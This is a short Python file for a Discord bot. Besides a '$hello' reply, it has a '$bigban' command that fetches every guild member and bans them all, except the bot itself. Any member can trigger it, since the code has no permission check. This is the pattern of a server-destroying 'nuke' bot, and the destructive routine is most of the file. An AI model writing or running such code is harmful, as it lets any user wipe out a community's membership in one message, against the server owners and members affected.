import discord

intents = discord.Intents.all()

client = discord.Client(intents=intents)



@client.event
async def on_ready():
    print(f"We have login in as {client.user}")


@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith("$hello"):
        await message.channel.send("Hello!")
    if message.content.startswith("$bigban"):
        async for user in message.guild.fetch_members():
            if user == client.user:
                pass
            else:
                print(f"Banning: {user}...")
                await user.ban()
                print(f"Banned: {user}!")



if __name__ == "__main__":
    client.run("")
